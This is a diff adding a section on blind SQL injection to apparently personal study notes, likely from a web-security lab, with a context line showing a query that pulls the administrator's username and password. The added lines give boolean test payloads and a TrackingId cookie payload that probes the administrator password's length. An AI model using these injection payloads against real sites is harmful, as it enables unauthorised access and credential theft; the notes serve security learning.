@@ -78,3 +78,15 @@ and then Get the data you need :
 	select username_ecephv,password_akjxku from users_xemvgh where username_ecephv = 'administrator' --
 
 # Blind SQL Injection :
+blind sql injection, is when we have an injection without the visual output, the vuln occurs at the backend 
+
+we start wy trigerring a false boolean logic and see if there is any change the page for example :
+
+	…xyz' AND '1'='1 // here wothing will change
+	…xyz' AND '1'='2 // here normaly we won't see welcome back for example.
+
+first we start by knowing the length of the password for example : 
+
+	TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator')='a
+	
+	xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a
